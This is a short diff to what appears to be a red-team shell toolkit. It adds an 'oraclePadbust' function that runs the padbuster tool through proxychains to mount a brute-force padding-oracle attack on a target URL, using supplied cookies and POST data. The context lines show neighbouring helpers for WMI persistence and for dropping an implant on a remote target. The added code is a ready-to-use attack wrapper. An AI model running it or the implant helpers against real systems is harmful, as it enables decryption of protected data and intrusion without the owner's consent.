@@ -1124,6 +1124,34 @@ function removeWmiPersist(){
 
 # SECTION: Exploitation helper functions:
 
+function oraclePadbust(){
+    # DESCRIPTION: Generic oracle padding attack using post and cookie files.
+    # ARGUMENT: URL, ENCDATA, POSTFILE, COOKIEFILE.        
+    URL=$1;
+    ENCDATA=$2;
+    POSTFILE=$3;
+    COOKIEFILE=$4;
+    BLOCKSIZE=8;
+    ENCODING=0;
+    HOSTHEADER=`echo ${URL}|cut -d '/' -f3`;
+    HEADERS="Host::${HOSTHEADER}";    
+    POSTDATA=`cat ${POSTFILE}`;    
+    COOKIES=`cat ${COOKIEFILE}`;
+    proxychains \
+    padbuster \
+    "$URL" \
+    "$ENCDATA" \
+    ${BLOCKSIZE} \
+    -bruteforce \
+    -encoding ${ENCODING} \
+    -headers ${HEADERS} \
+    -cookies "${COOKIES}" \
+    -post "${POSTDATA}" \
+    -noencode \
+    -noiv -verbose
+    return;
+}
+
 function dropImplant(){
     # DESCRIPTION: Drop implant on remote target using WMI.
     # ARGUMENT: TARGET.
